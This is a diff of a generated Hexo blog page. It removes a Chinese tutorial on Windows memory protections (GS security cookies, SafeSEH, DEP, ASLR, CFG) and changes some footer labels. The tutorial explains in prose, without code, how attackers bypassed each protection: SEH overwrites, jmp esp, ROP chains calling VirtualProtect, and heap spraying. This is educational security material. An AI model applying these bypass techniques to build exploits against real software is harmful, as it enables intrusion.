-<h2 id="二、windows下的内存保护机制"><a href="#二、windows下的内存保护机制" class="headerlink" title="二、windows下的内存保护机制"></a>二、windows下的内存保护机制</h2><h3 id="0x00、二进制漏洞"><a href="#0x00、二进制漏洞" class="headerlink" title="0x00、二进制漏洞"></a>0x00、二进制漏洞</h3><p>二进制漏洞是可执行文件（PE、ELF文件等）因编码时考虑不周，造成的软件执行了非预期的功能。二进制漏洞早期主要以栈溢出为主。<br>我们都知道在C语言中调用一个函数，在编译后执行的是CALL指令,CALL指令会执行两个操作：<br>（1）、将CALL指令之后下一条指令入栈。<br>（2）、跳转到函数地址。<br>函数在开始执行时主要工作为保存该函数会修改的寄存器的值和申请局部变量<br>空间，而在函数执行结束时主要的工作为：<br>（1）、将函数返回值入eax<br>（2）、恢复本函数调用前的寄存器值<br>（3）、释放局部变量空间<br>（4）、调用ret指令跳转到函数调用结束后的下一条指令（返回地址）<br>栈溢出指的是局部变量在使用过程中，由于代码编写考虑不当，造成了其大小超出了其本身的空间，覆盖掉了前栈帧EBP和返回地址等。由于返回地址不对，函数调用结束后跳转到了不可预期的地址，造成了程序崩溃。<br>早期的栈溢出漏洞利用就是将函数的返回地址覆盖成一个可预期的地址，从而控制程序执行流程触发shellcode。漏洞发生时，能控制的数据（包含shellcode）在局部变量中，局部变量又存在于栈上面，因此要想执行shellcode必须将程序执行流程跳转到栈上。<br>shellcode存好了，返回地址也可控，如果将返回地址改写为shellcode地址就OK了，可偏偏栈的地址在不同环境中是不固定的。<br>这时候有聪明的程序员发现了一条妙计，栈地址不固定，但是程序地址是固定的。通过在程序代码中搜索jmp esp指令地址，将返回地址改成jmp esp的地址，就可以实现控制程序执行流程跳转到栈上执行shellcode。</p>
-<h3 id="0x01、启用GS选项"><a href="#0x01、启用GS选项" class="headerlink" title="0x01、启用GS选项"></a>0x01、启用GS选项</h3><p>启用GS选项是在编辑器中可以启用的一项选择。<br>启用GS选项之后，会在函数执行一开始先往栈上保存一个数据，等函数返回时候检查这个数据，若不一致则为被覆盖，这样就跳转进入相应的处理过程，不再返回，因此shellcode也就无法被执行，这个值被称为“Security cookie”。<br>感兴趣的同学可以编写一个DEMO启用GS后编译，使用IDA便可以看软件到调用Check_Security_Cookie()检查栈是否被覆盖。<br>可是他们忽略了异常处理SEH链也在栈上因此可以覆盖SEH链为jmp esp的地址，之后触发异常跳转到esp执行shellcode。<br>有关SEH链的的技术可以参考<a href="http://blog.csdn.net/hustd10/article/details/51167971。" target="_blank" rel="noopener">http://blog.csdn.net/hustd10/article/details/51167971。</a></p>
-<h3 id="0x02、SafeSEH"><a href="#0x02、SafeSEH" class="headerlink" title="0x02、SafeSEH"></a>0x02、SafeSEH</h3><p>SafeSEH是在程序编译的时候，就将所有的异常处理函数进行注册。凡是执行过程中触发异常后，都要经过一个检验函数，检查SEH链指向的地址是否在注册的列表中。<br>可是再检验函数的逻辑中阻止执行的情况只有在SEH链指向模块（exe、dll）地址的情况下，如果SEH链指向的地址不在这些模块中，那就可以执行了。因此在程序中非模块的数据空间找到jmp esp，比方说nls后缀的资源文件等。或者是在支持JS脚本的软件中（浏览器等），通过脚本申请堆空间写入shellcode。</p>
-<h3 id="0x03、DEP"><a href="#0x03、DEP" class="headerlink" title="0x03、DEP"></a>0x03、DEP</h3><p>数据执行保护（DEP）指的是堆和栈只有读写权限没有执行权限。<br>对抗DEP的方式是将shellcode写入堆栈中，从程序自身的代码去凑到执行VirtualProtect()将shellcode所在内存属性添加上可执行权限，将函数返回值或者SEH链覆盖成代码片段的起始地址。这种利用程序自身碎片绕过DEP的方式被称作ROP，关于ROP的技术细节可以参考<a href="http://rickgray.me/2014/08/26/bypass-dep-with-rop-study.html。" target="_blank" rel="noopener">http://rickgray.me/2014/08/26/bypass-dep-with-rop-study.html。</a><br>ROP技术是通过拼凑代码碎片执行API，在最开始没有相应辅助工具的时候，构建ROP链是耗时耗力的。随着研究人员的增多，相应的辅助工具也被开发出来，ROP链的构建已经相对容易了。</p>
-<h3 id="0x04、ASLR"><a href="#0x04、ASLR" class="headerlink" title="0x04、ASLR"></a>0x04、ASLR</h3><p>ROP技术的前提是代码片段的地址固定，这样才能知道往函数返回值或者SEH链中填写哪个地址。因此地址空间布局随机化（ASLR）应运而上，ALSR即是让exe、dll的地址全都随机。<br>对抗ASLR的方式是暴力把程序空间占满，全铺上shellcode，只要跳转地址没落在已有模块中，落在我们的空间中即可以执行了shellcode，但是这样做无法绕过DEP，这种将程序空间全部占满铺上shellcode的技术被称为堆喷射技术，堆喷射技术只能对抗ASLR，缺无法对抗ASLR+DEP的双重防护。<br>ASLR+DEP的双重防护使得大多数软件的漏洞只能造成崩溃，无法稳定利用。将程序空间占满的技术，称之为堆喷射（Heap Spraying），这种技术只能应用在可以执行JS等脚本的软件上，如浏览器等。<br>堆喷射通过大面积的申请内存空间并构造适当的数据，一旦EIP指向这片空间，就可以执行shellcode。堆喷射已经是不得已而为之，有时候会造成系统卡一段时间，容易被发现；另一点，如果EIP恰好指向shellcode中间部分就会造成漏洞利用失败，因此不能保证100%成功。<br>关于堆喷射技术可以参考<a href="http://blog.chinaunix.net/uid-24917554-id-3492618.html。" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-24917554-id-3492618.html。</a><br>因为ASLR+DEP的双重防护使得PC上的软件若存在漏洞也无法稳定利用，因为safeSEH技术的存在大多数的软件安全研究者都转向了浏览器+JS，可是因为JS的效率问题，JS也渐渐的使用变少，此时FLASH的AS脚本渐渐进入了人们的视野，而且FLASH不仅仅在windows上，包括Linux和Andriod均可以使用。因此很多的软件安全研究人员转向了浏览器+AS。<br>由于二进制漏洞破坏了程序执行流程，因此如果执行了shellcode之后不做其他处理，软件会崩溃掉。通常的做法是shellcode调用ExitProcess退出进程，这样会造成软件打开了闪退掉。而Flash作为浏览器插件的存在，居然发展出很多不卡不闪不挂的漏洞，Flash漏洞利用研究如星火燎原般炽热。因此大多数的浏览器渐渐的不再支持FLASH插件，HTML5动画技术也渐渐的发展起来。</p>
-<h3 id="0x05、CFG"><a href="#0x05、CFG" class="headerlink" title="0x05、CFG"></a>0x05、CFG</h3><p>虽然FlASH的漏洞使得其他厂商有点无奈，但是微软并没有停止防守的脚步。微软在Win 8.1 Update 3以及Win 10中启用了一种抵御内存泄露攻击的新机制，即Control Flow Guard(CFG)——控制流防护。这项技术是为了弥补此前不完美的保护机制，例如地址空间布局随机化(ASLR)导致了堆喷射的发展，而数据执行保护(DEP)造成了漏洞利用代码中返回导向编程(ROP)技术的发展。<br>有关CFG控制流保护的分析可以参考<a href="http://www.freebuf.com/articles/security-management/58373.html。" target="_blank" rel="noopener">http://www.freebuf.com/articles/security-management/58373.html。</a></p>
-<p>绕过CFG的研究也在不断的进行比如<a href="http://blog.nsfocus.net/win10-cfg-bypass/" target="_blank" rel="noopener">http://blog.nsfocus.net/win10-cfg-bypass/</a> 以及XCon2016的议题《JIT喷射技术不死—利用WARP Shader JIT喷射绕过控制流保护（CFG）》。</p>
-<h2 id="摘自https-www-52pojie-cn-forum-php-mod-viewthread-amp-tid-588708"><a href="#摘自https-www-52pojie-cn-forum-php-mod-viewthread-amp-tid-588708" class="headerlink" title="摘自https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=588708"></a>摘自<a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=588708" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=588708</a></h2><p>参考：<a href="https://www.cnblogs.com/chenmingjun/p/8280889.html" target="_blank" rel="noopener">https://www.cnblogs.com/chenmingjun/p/8280889.html</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2453,8 +2269,8 @@ rand()产生的是伪随机数字，每次执行时是相同的; 若要不同, �
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">87</span>
-                    <span class="site-state-item-name">Artikel</span>
+                    <span class="site-state-item-count">89</span>
+                    <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
               
@@ -2491,7 +2307,7 @@ rand()产生的是伪随机数字，每次执行时是相同的; 若要不同, �
                       
                     
                     <span class="site-state-item-count">12</span>
-                    <span class="site-state-item-name">Kategorien</span>
+                    <span class="site-state-item-name">categorie</span>
                   </a>
                 </div>
               
@@ -2543,7 +2359,7 @@ rand()产生的是伪随机数字，每次执行时是相同的; 若要不同, �
 </div>
 
 
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
 
 
 
@@ -2551,7 +2367,7 @@ rand()产生的是伪随机数字，每次执行时是相同的; 若要不同, �
 
 
 
-  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.7.0</div>
+  <div class="theme-info">Tema – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.7.0</div>
 
 
 
